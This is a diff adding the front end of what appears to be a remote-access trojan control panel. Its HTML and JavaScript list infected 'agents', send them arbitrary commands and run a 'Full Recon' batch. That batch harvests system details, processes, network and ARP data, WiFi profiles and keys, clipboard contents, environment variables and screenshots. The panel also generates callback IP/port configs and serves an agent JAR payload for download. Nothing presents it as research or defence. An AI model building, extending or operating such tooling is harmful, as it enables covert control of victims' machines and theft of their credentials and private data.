+          <div class="intel-item"><div class="intel-item-label">Protocol</div><div style="font-size:.8em;color:var(--cyan);margin-top:3px">✔ HTTP GETs · base64 encoded URL</div></div>
+        </div>
+      </div>
+
+    </div>
+  </div>
+</div>
+</div>
+
+<!-- ══════════════════════════════════════
+     TAB 3 — TARGET INTEL
+══════════════════════════════════════ -->
+<div id="tab-intel" class="tab-content">
+<div class="page-wrapper">
+  <div class="intel-layout">
+
+    <!-- Sidebar -->
+    <div class="intel-sidebar">
+      <div class="card" style="padding:14px">
+        <div class="section-title">Targets</div>
+        <div id="intel-agent-list">
+          <div class="empty-state text-sm" style="padding:25px">No agents</div>
+        </div>
+        <div class="divider"></div>
+        <div style="display:flex;flex-direction:column;gap:7px">
+          <button class="btn btn-primary btn-sm btn-block" onclick="runFullRecon()">Full Recon</button>
+          <button class="btn btn-ghost btn-sm btn-block" onclick="loadIntelAll()">Refresh</button>
+        </div>
+      </div>
+    </div>
+
+    <!-- Content -->
+    <div>
+      <div id="intel-no-agent" class="card" style="text-align:center;padding:60px 20px">
+        <div style="font-size:2em;font-weight:700;letter-spacing:-.05em;margin-bottom:14px;opacity:.2;color:var(--accent)">[INTEL]</div>
+        <div class="fw-600 text-mid" style="margin-bottom:7px">Select a target from the sidebar</div>
+        <div class="text-sm text-dim">All collected intelligence will be displayed here</div>
+      </div>
+
+      <div id="intel-content" class="intel-sections" style="display:none">
+
+        <!-- System -->
+        <div class="intel-section open" id="sec-sysinfo">
+          <div class="intel-section-header" onclick="toggleSection('sec-sysinfo')">
+            <div class="intel-section-icon" style="background:rgba(79,142,247,.15);font-size:.65em;font-weight:700;color:var(--accent)">SYS</div>
+            <span class="intel-section-title">System Information</span>
+            <span class="intel-section-status" id="sec-sysinfo-status"></span>
+            <span class="intel-chevron">▼</span>
+          </div>
+          <div class="intel-section-body">
+            <div class="intel-grid">
+              <div class="intel-item"><div class="intel-item-label">Agent ID</div><div class="intel-item-value" id="ii-id">—</div></div>
+              <div class="intel-item"><div class="intel-item-label">IP Address</div><div class="intel-item-value" id="ii-ip">—</div></div>
+              <div class="intel-item"><div class="intel-item-label">OS</div><div class="intel-item-value" id="ii-os">—</div></div>
+              <div class="intel-item"><div class="intel-item-label">Username</div><div class="intel-item-value" id="ii-user">—</div></div>
+              <div class="intel-item"><div class="intel-item-label">Current Path</div><div class="intel-item-value" id="ii-path">—</div></div>
+              <div class="intel-item"><div class="intel-item-label">Stage</div><div class="intel-item-value" id="ii-stage">—</div></div>
+              <div class="intel-item"><div class="intel-item-label">First Seen</div><div class="intel-item-value" id="ii-first">—</div></div>
+              <div class="intel-item"><div class="intel-item-label">Last Seen</div><div class="intel-item-value" id="ii-last">—</div></div>
+            </div>
+            <div class="intel-item mt-8"><div class="intel-item-label">Drives</div>
+              <div class="code-block" id="ii-drives" style="max-height:110px;margin-top:5px">—</div></div>
+            <div class="intel-item mt-8"><div class="intel-item-label">Full Sysinfo</div>
+              <div class="code-block" id="ii-sysinfo" style="max-height:190px;margin-top:5px">—</div></div>
+          </div>
+        </div>
+
+        <!-- Processes -->
+        <div class="intel-section" id="sec-procs">
+          <div class="intel-section-header" onclick="toggleSection('sec-procs')">
+            <div class="intel-section-icon" style="background:rgba(251,191,36,.15);font-size:.65em;font-weight:700;color:var(--yellow)">PRC</div>
+            <span class="intel-section-title">Processes &amp; JVMs</span>
+            <span class="intel-section-status" id="sec-procs-status"></span>
+            <span class="intel-chevron">▼</span>
+          </div>
+          <div class="intel-section-body">
+            <div style="display:flex;gap:8px;margin-bottom:11px">
+              <button class="btn btn-ghost btn-xs" onclick="qcmd('listproc')">↺ Processes</button>
+              <button class="btn btn-ghost btn-xs" onclick="qcmd('listJVMs')">↺ JVMs</button>
+            </div>
+            <div class="intel-item mb-10"><div class="intel-item-label">JVM Instances</div>
+              <div class="code-block" id="ii-jvms" style="max-height:110px;margin-top:5px">—</div></div>
+            <div class="intel-item"><div class="intel-item-label">Process List</div>
+              <div class="code-block" id="ii-procs" style="max-height:240px;margin-top:5px">—</div></div>
+          </div>
+        </div>
+
+        <!-- Network -->
+        <div class="intel-section" id="sec-network">
+          <div class="intel-section-header" onclick="toggleSection('sec-network')">
+            <div class="intel-section-icon" style="background:rgba(34,211,238,.15);font-size:.65em;font-weight:700;color:var(--cyan)">NET</div>
+            <span class="intel-section-title">Network Intelligence</span>
+            <span class="intel-section-status" id="sec-network-status"></span>
+            <span class="intel-chevron">▼</span>
+          </div>
+          <div class="intel-section-body">
+            <div style="display:flex;gap:8px;margin-bottom:11px">
+              <button class="btn btn-ghost btn-xs" onclick="qcmd('netconn')">↺ Conns</button>
+              <button class="btn btn-ghost btn-xs" onclick="qcmd('arp')">↺ ARP</button>
+              <button class="btn btn-ghost btn-xs" onclick="qcmd('wifi_profiles')">↺ WiFi</button>
+            </div>
+            <div class="intel-item mb-10"><div class="intel-item-label">Active Connections</div>
+              <div class="code-block" id="ii-netconn" style="max-height:190px;margin-top:5px">—</div></div>
+            <div class="intel-grid">
+              <div class="intel-item"><div class="intel-item-label">ARP Table</div>
+                <div class="code-block" id="ii-arp" style="max-height:140px;margin-top:5px">—</div></div>
+              <div class="intel-item"><div class="intel-item-label">WiFi Profiles &amp; Keys</div>
+                <div class="code-block" id="ii-wifi" style="max-height:140px;margin-top:5px">—</div></div>
+            </div>
+          </div>
+        </div>
+
+        <!-- Clipboard & Env -->
+        <div class="intel-section" id="sec-data">
+          <div class="intel-section-header" onclick="toggleSection('sec-data')">
+            <div class="intel-section-icon" style="background:rgba(167,139,250,.15);font-size:.65em;font-weight:700;color:var(--accent2)">ENV</div>
+            <span class="intel-section-title">Clipboard &amp; Environment</span>
+            <span class="intel-section-status" id="sec-data-status"></span>
+            <span class="intel-chevron">▼</span>
+          </div>
+          <div class="intel-section-body">
+            <div style="display:flex;gap:8px;margin-bottom:11px">
+              <button class="btn btn-ghost btn-xs" onclick="qcmd('clipboard')">↺ Clipboard</button>
+              <button class="btn btn-ghost btn-xs" onclick="qcmd('envvars')">↺ Env Vars</button>
+            </div>
+            <div class="intel-item mb-10"><div class="intel-item-label">Clipboard Contents</div>
+              <div class="code-block" id="ii-clipboard" style="max-height:140px;margin-top:5px">—</div></div>
+            <div class="intel-item"><div class="intel-item-label">Environment Variables</div>
+              <div class="code-block" id="ii-envvars" style="max-height:240px;margin-top:5px">—</div></div>
+          </div>
+        </div>
+
+        <!-- Screenshots -->
+        <div class="intel-section" id="sec-screenshots">
+          <div class="intel-section-header" onclick="toggleSection('sec-screenshots')">
+            <div class="intel-section-icon" style="background:rgba(52,211,153,.15);font-size:.65em;font-weight:700;color:var(--green)">IMG</div>
+            <span class="intel-section-title">Screenshots</span>
+            <span class="intel-section-status" id="sec-ss-status"></span>
+            <span class="intel-chevron">▼</span>
+          </div>
+          <div class="intel-section-body">
+            <div style="display:flex;gap:8px;margin-bottom:12px">
+              <button class="btn btn-green btn-xs" onclick="qcmd('screenshot')">Capture Now</button>
+            </div>
+            <div id="ii-gallery" class="screenshot-gallery">
+              <div class="empty-state text-sm" style="padding:18px">No screenshots yet</div>
+            </div>
+          </div>
+        </div>
+
+        <!-- Raw Log -->
+        <div class="intel-section" id="sec-raw">
+          <div class="intel-section-header" onclick="toggleSection('sec-raw')">
+            <div class="intel-section-icon" style="background:rgba(248,113,113,.15);font-size:.65em;font-weight:700;color:var(--red)">LOG</div>
+            <span class="intel-section-title">Raw Results Log</span>
+            <span class="intel-section-status" id="sec-raw-status"></span>
+            <span class="intel-chevron">▼</span>
+          </div>
+          <div class="intel-section-body">
+            <div class="output-box" id="ii-raw" style="max-height:400px">
+              <div class="empty-state text-sm" style="padding:18px">No results yet</div>
+            </div>
+          </div>
+        </div>
+
+      </div>
+    </div>
+
+  </div>
+</div>
+</div>
+
+<!-- JAVASCRIPT -->
+<script>
+const socket = io();
+let selectedAgent = null;
+let intelAgent    = null;
+let cmdCount      = 0;
+let allAgents     = {};
+let lbImages      = [];
+let lbIndex       = 0;
+let generatedConfig = '';
+
+
+function switchTab(name) {
+  document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
+  document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
+  document.getElementById('tab-'+name).classList.add('active');
+  document.getElementById('tab-btn-'+name).classList.add('active');
+  if (name === 'intel') refreshIntelList();
+}
+
+
+socket.on('connect', () => {
+  document.getElementById('connection-status').textContent = 'Connected';
+});
+socket.on('disconnect', () => {
+  document.getElementById('connection-status').textContent = 'Disconnected';
+});
+socket.on('agents_list', agents => updateAgentsTable(agents));
+socket.on('new_agent', () => loadAgents());
+socket.on('agent_result', data => {
+  if (selectedAgent === data.agent_id) addOutput(data.time, data.result);
+  if (intelAgent    === data.agent_id) { loadIntelProfile(); loadIntelResults(); }
+});
+socket.on('profile_update', data => {
+  if (selectedAgent === data.agent_id) refreshSidebar();
+  if (intelAgent    === data.agent_id) loadIntelProfile();
+});
+socket.on('screenshot_update', data => {
+  if (selectedAgent === data.agent_id) refreshSidebar();
+  if (intelAgent    === data.agent_id) loadIntelScreenshots();
+});
+
+
+async function loadAgents() {
+  try {
+    const res = await fetch('/api/agents');
+    const agents = await res.json();
+    allAgents = {};
+    agents.forEach(a => allAgents[a.id] = a);
+    updateAgentsTable(agents);
+  } catch(e) {}
+}
+
+function updateAgentsTable(agents) {
+  const n = agents.length;
+  const ag = agents.filter(a => a.stage === 'Aggressive').length;
+  document.getElementById('stat-total').textContent      = n;
+  document.getElementById('stat-active').textContent     = n;
+  document.getElementById('stat-aggressive').textContent = ag;
+  document.getElementById('badge-agents').textContent    = n;
+  document.getElementById('badge-intel').textContent     = n;
+
+  const tbody = document.getElementById('agents-tbody');
+  if (n === 0) {
+    tbody.innerHTML = '<tr><td colspan="7"><div class="empty-state"><div class="empty-text">Waiting for agents to connect…</div></div></td></tr>';
+    return;
+  }
+  tbody.innerHTML = agents.map(a => `
+    <tr onclick="selectDashAgent('${a.id}')">
+      <td><span class="monospace" style="font-size:.8em;color:var(--accent)">${a.id}</span></td>
+      <td style="color:var(--cyan)">${a.ip || '—'}</td>
+      <td>${a.os || '—'}</td>
+      <td class="text-mid">${a.user || '—'}</td>
+      <td><span class="badge ${a.stage==='Aggressive'?'badge-red':'badge-green'}">${a.stage||'Agent'}</span></td>
+      <td class="text-dim text-xs">${a.last_seen||'—'}</td>
+      <td>
+        <div style="display:flex;gap:5px">
+          <button class="btn btn-ghost btn-xs" onclick="selectDashAgent('${a.id}');event.stopPropagation()">Control</button>
+          <button class="btn btn-purple btn-xs" onclick="openIntel('${a.id}');event.stopPropagation()">Intel</button>
+        </div>
+      </td>
+    </tr>
+  `).join('');
+}
+
+
+async function selectDashAgent(id) {
+  selectedAgent = id;
+  document.getElementById('cmd-panel').style.display    = 'block';
+  document.getElementById('output-panel').style.display = 'block';
+  document.getElementById('agent-sidebar').style.cssText = 'display:flex;flex-direction:column';
+  document.getElementById('cmd-panel-title').textContent = 'Command Panel';
+  document.getElementById('cmd-agent-badge').textContent = id;
+  await refreshSidebar();
+  await loadDashResults();
+  clearInterval(window._sidebarTimer);
+  window._sidebarTimer = setInterval(refreshSidebar, 10000);
+  clearInterval(window._resultTimer);
+  window._resultTimer = setInterval(loadDashResults, 4000);
+}
+
+async function refreshSidebar() {
+  if (!selectedAgent) return;
+  try {
+    const res = await fetch(`/api/agent/${selectedAgent}/profile`);
+    const p   = await res.json();
+    document.getElementById('si-id').textContent   = p.id            || '—';
+    document.getElementById('si-ip').textContent   = p.ip            || '—';
+    document.getElementById('si-os').textContent   = p.os            || '—';
+    document.getElementById('si-user').textContent = p.user          || '—';
+    document.getElementById('si-path').textContent = p.current_path  || '—';
+    document.getElementById('si-stage').textContent= allAgents[selectedAgent]?.stage || '—';
+    document.getElementById('si-clip').textContent = p.clipboard      ? p.clipboard.substring(0,180)      : '—';
+    document.getElementById('si-net').textContent  = p.net_connections? p.net_connections.substring(0,180): '—';
+    document.getElementById('si-arp').textContent  = p.arp_table      ? p.arp_table.substring(0,180)      : '—';
+
+    const ssRes = await fetch(`/api/agent/${selectedAgent}/screenshots`);
+    const shots = await ssRes.json();
+    const card  = document.getElementById('si-ss-card');
+    const div   = document.getElementById('si-screenshot');
+    if (shots && shots.length > 0) {
+      card.style.display = 'block';
+      window._dashShots = shots.map(s => s.url);
+      const latest = shots[shots.length-1];
+      div.innerHTML = `<img src="${latest.url}" style="width:100%;border-radius:7px;cursor:pointer;border:1px solid var(--border)" onclick="openLb('${latest.url}',window._dashShots)" loading="lazy">`;
+    } else if (p.screenshot) {
+      card.style.display = 'block';
+      window._dashShots = [p.screenshot];
+      div.innerHTML = `<img src="${p.screenshot}" style="width:100%;border-radius:7px;cursor:pointer;border:1px solid var(--border)" onclick="openLb('${p.screenshot}',[])">`;
+    } else {
+      card.style.display = 'none';
+    }
+  } catch(e) {}
+}
+
+async function loadDashResults() {
+  if (!selectedAgent) return;
+  try {
+    const res = await fetch(`/api/agent/${selectedAgent}/results`);
+    const results = await res.json();
+    const box = document.getElementById('output-box');
+    if (results.length === 0) { box.innerHTML = '<div class="empty-state text-sm" style="padding:26px">No output yet</div>'; return; }
+    box.innerHTML = results.map(r =>
+      `<div class="output-entry"><div class="output-time">${r.time}</div><pre class="output-pre">${escHtml(r.output)}</pre></div>`
+    ).join('');
+    box.scrollTop = box.scrollHeight;
+  } catch(e) {}
+}
+
+
+async function qcmd(cmd) {
+  if (!selectedAgent) { alert('Select an agent first'); return; }
+  await sendCmd(cmd);
+}
+
+async function execCmd() {
+  const input = document.getElementById('cmd-input');
+  const val = input.value.trim();
+  if (!val || !selectedAgent) return;
+  await sendCmd(val);
+  input.value = '';
+}
+
+async function sendCmd(cmd) {
+  try {
+    const res = await fetch(`/api/agent/${selectedAgent}/command`, {
+      method: 'POST',
+      headers: {'Content-Type':'application/json'},
+      body: JSON.stringify({command: cmd})
+    });
+    if (res.ok) {
+      cmdCount++;
+      document.getElementById('stat-cmds').textContent = cmdCount;
+      addOutput(new Date().toLocaleTimeString(), '→ Queued: ' + cmd);
+    }
+  } catch(e) {}
+}
+
+function addOutput(time, text) {
+  const box = document.getElementById('output-box');
+  const es  = box.querySelector('.empty-state');
+  if (es) es.remove();
+  const d = document.createElement('div');
+  d.className = 'output-entry';
+  d.innerHTML = `<div class="output-time">${time}</div><pre class="output-pre">${escHtml(text)}</pre>`;
+  box.appendChild(d);
+  box.scrollTop = box.scrollHeight;
+}
+
+function clearOutput() {
+  document.getElementById('output-box').innerHTML = '<div class="empty-state text-sm" style="padding:26px">Cleared</div>';
+}
+
+
+function openIntel(id) {
+  intelAgent = id;
+  if (!selectedAgent) selectedAgent = id;
+  switchTab('intel');
+  refreshIntelList();
+  loadIntelAll();
+}
+
+function refreshIntelList() {
+  const list = document.getElementById('intel-agent-list');
+  const ids  = Object.keys(allAgents);
+  if (ids.length === 0) {
+    list.innerHTML = '<div class="empty-state text-sm" style="padding:20px">No agents</div>';
+    return;
+  }
+  list.innerHTML = ids.map(id => {
+    const a = allAgents[id];
+    return `<div class="agent-card-item ${intelAgent===id?'selected':''}" data-id="${id}" onclick="openIntel('${id}')">
+      <div class="agent-card-name"><span class="online-dot"></span>${id}</div>
+      <div class="agent-card-meta">${a.ip} · ${a.os||'?'}</div>
+    </div>`;
+  }).join('');
+}
+
+function loadIntelAll() {
+  loadIntelProfile();
+  loadIntelResults();
+  loadIntelScreenshots();
+}
+
+async function loadIntelProfile() {
+  if (!intelAgent) return;
+  document.getElementById('intel-no-agent').style.display = 'none';
+  document.getElementById('intel-content').style.display  = 'flex';
+  document.getElementById('intel-content').style.flexDirection = 'column';
+  try {
+    const [pRes, aRes] = await Promise.all([
+      fetch(`/api/agent/${intelAgent}/profile`),
+      fetch(`/api/agents`)
+    ]);
+    const p = await pRes.json();
+    const agents = await aRes.json();
+    const a = agents.find(x => x.id === intelAgent) || {};
+
+    document.getElementById('ii-id').textContent    = p.id            || '—';
+    document.getElementById('ii-ip').textContent    = p.ip            || '—';
+    document.getElementById('ii-os').textContent    = p.os            || '—';
+    document.getElementById('ii-user').textContent  = p.user          || '—';
+    document.getElementById('ii-path').textContent  = p.current_path  || '—';
+    document.getElementById('ii-stage').textContent = a.stage         || '—';
+    document.getElementById('ii-first').textContent = p.first_seen    || '—';
+    document.getElementById('ii-last').textContent  = a.last_seen     || '—';
+    document.getElementById('ii-drives').textContent = p.drives       || '—';
+    document.getElementById('ii-sysinfo').textContent = p.system_info || '—';
+    document.getElementById('sec-sysinfo-status').textContent = p.os || '';
+
+    document.getElementById('ii-jvms').textContent  = p.jvms       || '—';
+    document.getElementById('ii-procs').textContent = p.processes  || '—';
+    document.getElementById('sec-procs-status').textContent = p.processes ? 'data available' : '';
+
+    document.getElementById('ii-netconn').textContent = p.net_connections || '—';
+    document.getElementById('ii-arp').textContent     = p.arp_table       || '—';
+    document.getElementById('ii-wifi').textContent    = p.wifi_profiles   || '—';
+    document.getElementById('sec-network-status').textContent = p.net_connections ? 'data available' : '';
+
+    document.getElementById('ii-clipboard').textContent = p.clipboard || '—';
+    document.getElementById('ii-envvars').textContent   = p.env_vars  || '—';
+    document.getElementById('sec-data-status').textContent = p.clipboard ? 'data available' : '';
+  } catch(e) {}
+}
+
+async function loadIntelResults() {
+  if (!intelAgent) return;
+  try {
+    const res = await fetch(`/api/agent/${intelAgent}/results`);
+    const results = await res.json();
+    const box = document.getElementById('ii-raw');
+    document.getElementById('sec-raw-status').textContent = results.length ? `${results.length} entries` : '';
+    if (results.length === 0) { box.innerHTML = '<div class="empty-state text-sm" style="padding:18px">No results yet</div>'; return; }
+    box.innerHTML = results.map(r =>
+      `<div class="output-entry"><div class="output-time">${r.time}</div><pre class="output-pre">${escHtml(r.output)}</pre></div>`
+    ).join('');
+    box.scrollTop = box.scrollHeight;
+  } catch(e) {}
+}
+
+async function loadIntelScreenshots() {
+  if (!intelAgent) return;
+  try {
+    const res = await fetch(`/api/agent/${intelAgent}/screenshots`);
+    const shots = await res.json();
+    const gallery = document.getElementById('ii-gallery');
+    document.getElementById('sec-ss-status').textContent = shots.length ? `${shots.length} captures` : '';
+    if (shots.length === 0) { gallery.innerHTML = '<div class="empty-state text-sm" style="padding:18px">No screenshots yet</div>'; return; }
+    window._intelShots = shots.map(s => s.url);
+    gallery.innerHTML = shots.map((s,i) => `
+      <div class="screenshot-thumb" onclick="openLb('${s.url}',window._intelShots)">
+        <img src="${s.url}" alt="Screenshot ${i+1}" loading="lazy">
+        <div class="screenshot-thumb-time">${s.timestamp}</div>
+      </div>
+    `).join('');
+  } catch(e) {}
+}
+
+async function runFullRecon() {
+  if (!intelAgent) { alert('Select a target first'); return; }
+  selectedAgent = intelAgent;
+  const cmds = ['systeminfo','getuid','currentpath','drives','listproc','listJVMs',
+                 'clipboard','envvars','netconn','arp','wifi_profiles','screenshot'];
+  for (const c of cmds) await sendCmd(c);
+  setTimeout(loadIntelAll, 10000);
+}
+
+function toggleSection(id) {
+  document.getElementById(id).classList.toggle('open');
+}
+
+
+function generateConfig() {
+  const ip   = document.getElementById('gen-ip').value.trim();
+  const port = document.getElementById('gen-port').value.trim();
+  if (!ip || !port) { showAlert('gen-alert','error','Enter IP and Port first.'); return; }
+  generatedConfig = `${ip}\n${port}`;
+  document.getElementById('config-preview').textContent = `${ip}:${port}`;
+  document.getElementById('btn-dl-cfg').disabled = false;
+  showAlert('gen-alert','success',`Config generated for ${ip}:${port}`);
+}
+
+async function downloadConfig() {
+  if (!generatedConfig) { showAlert('gen-alert','error','Generate first'); return; }
+  const ip   = document.getElementById('gen-ip').value.trim();
+  const port = document.getElementById('gen-port').value.trim();
+  try {
+    const res = await fetch('/api/generate-config', {
+      method:'POST', headers:{'Content-Type':'application/json'},
+      body: JSON.stringify({ip, port})
+    });
+    if (res.ok) {
+      const blob = await res.blob();
+      dlBlob(blob, 'config.ep'); return;
+    }
+  } catch(e) {}
+  dlBlob(new Blob([generatedConfig],{type:'text/plain'}), 'config.ep');
+}
+
+async function downloadJar() {
+  window.location.href = '/download/agent-jar';
+}
+
+async function copyConfig() {
+  const text = document.getElementById('config-preview').textContent;
+  try { await navigator.clipboard.writeText(text); showAlert('gen-alert','success','Copied to clipboard!'); }
+  catch(e) { showAlert('gen-alert','info','Select and copy manually.'); }
+}
+
+function dlBlob(blob, filename) {
+  const url = URL.createObjectURL(blob);
+  const a = document.createElement('a');
+  a.href = url; a.download = filename; a.click();
+  URL.revokeObjectURL(url);
+}
+
+function showAlert(id, type, msg) {
+  const el = document.getElementById(id);
+  const cls = {error:'alert-red', success:'alert-green', info:'alert-info', warning:'alert-yellow'}[type] || 'alert-info';
+  el.innerHTML = `<div class="alert ${cls}">${msg}</div>`;
+  el.style.display = 'block';
+  setTimeout(() => el.style.display = 'none', 4000);
+}
+
+
+function openLb(src, all) {
+  lbImages = (all && all.length) ? all : [src];
+  lbIndex  = Math.max(0, lbImages.indexOf(src));
+  document.getElementById('lb-img').src = lbImages[lbIndex];
+  document.getElementById('lb-counter').textContent = `${lbIndex+1} / ${lbImages.length}`;
+  document.getElementById('lightbox').classList.add('open');
+  document.body.style.overflow = 'hidden';
+}
+
+function closeLb() {
+  document.getElementById('lightbox').classList.remove('open');
+  document.body.style.overflow = '';
+}
+
+function lbClickOutside(e) {
+  if (e.target === document.getElementById('lightbox')) closeLb();
+}
+
+function lbNav(dir) {
+  lbIndex = (lbIndex + dir + lbImages.length) % lbImages.length;
+  document.getElementById('lb-img').src = lbImages[lbIndex];
+  document.getElementById('lb-counter').textContent = `${lbIndex+1} / ${lbImages.length}`;
+}
+
+document.addEventListener('keydown', e => {
+  if (!document.getElementById('lightbox').classList.contains('open')) return;
+  if (e.key === 'Escape')      closeLb();
+  if (e.key === 'ArrowLeft')   lbNav(-1);
+  if (e.key === 'ArrowRight')  lbNav(1);
+});
+
+
+function escHtml(s) {
+  return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+}
+
+
+loadAgents();
+setInterval(loadAgents, 5000);
+</script>
+</body>
+</html>
